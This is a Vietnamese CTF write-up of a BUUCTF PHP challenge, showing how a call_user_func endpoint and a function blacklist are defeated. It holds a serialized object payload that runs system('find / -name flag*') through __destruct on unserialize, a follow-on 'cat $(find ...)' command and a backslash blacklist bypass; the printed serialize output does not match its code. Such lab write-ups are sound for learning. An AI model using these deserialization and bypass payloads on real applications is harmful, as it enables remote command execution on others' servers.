Khi ta mở challenge thì nó có báo lỗi của hàm date()

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/734249ee-3ce3-46bd-9b5b-2edc341a3388)

Sau đó mình viewsource thì nó có 1 cái form ẩn có 2 tham số `func` và `p` được truyền theo method POST với giá trị lần lượt là `date` và `Y-m-d h:i:s a`.Theo đó nó trả lỗi gì đó với hàm date().Vậy là tham số `func` và `p` có liên quan đến nhau. Ta có thể đổi hàm date thành hàm khác  của tham số `func` và value khác với hàm `p`

Mình thử với hàm Md5 cho 123.Và đã thành công.

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/e0c86931-5265-47ee-8757-f116bf759aa7)

Sau đó mình thử ls ra nhưng đã bị filter mất rồi.

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/f1b2bb89-2576-400d-9d98-bed244ebc8ec)

Bây giờ ta sẽ tìm cách đọc source code của page với các hàm `readfile()`, `file_get_contents()`, `show_source()`,..

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/5c0d2d24-1e87-465f-9f31-c73e63c2b3eb)

Đầu tiên tham số func và p sẽ được xử lí qua 1 cái if để check xem func có phải là null hay k sau đó nó sẽ convert thành dạng lowercase.Tiếp theo nó sẽ check func truyền vào có đúng với blacklist aka `$disable_fun` nếu không thì nó sẽ gọi đến hàm gettime còn có thì trả về “Hacker…”.

Về hàm gettime, nó sẽ dùng 2 biến `func` và `p` là đầu vào, sau đó tạo 1 biến `$result` là kết quả của hàm `call_user_func($func,$p)`.Sau đó nó sẽ lấy type của biến result và xét theo nếu nó là string thì sẽ print ra còn ko nó sẽ trả về null.

```php
 function gettime($func, $p) {
        $result = call_user_func($func, $p);
        $a= gettype($result);
        if ($a == "string") {
            return $result;
        } else {return "";}
    }
```

Và ở Class test, có method magic __destruct() nó sẽ thực thi hàm gettime và method này sẽ tự động được gọi khi gọi hàm unserialize() lên 1 đối tượng

Vậy thì ta sẽ unserialize lên 1 đối tượng của class test với biến func và p 

Tạo serialize cho p

```php
<?php
class Test {
    var $func = "system";
    var $p = "find / -name flag*";

}
$a = new Test();
echo serialize($a);
?>
//output:O:4:"Test":2:{s:4:"func";s:3:"cat";s:1:"p";s:18:"find / -name flag*";}
```

Nó cho ra 1 núi flag

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/c0a9c29a-2fa1-40c8-bd9a-df4344b97a8b)


Giờ thì mình thử sài lệnh cat `cat $(find / -name flag*)` là lấy được falg



Hoặc ta có thể sử dụng `\` để bypass blacklist,php sẽ nhận dạng nó là chuỗi đặc biệt.

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/edfc91d5-fd3f-43a5-a900-2c22c7c4fb11)

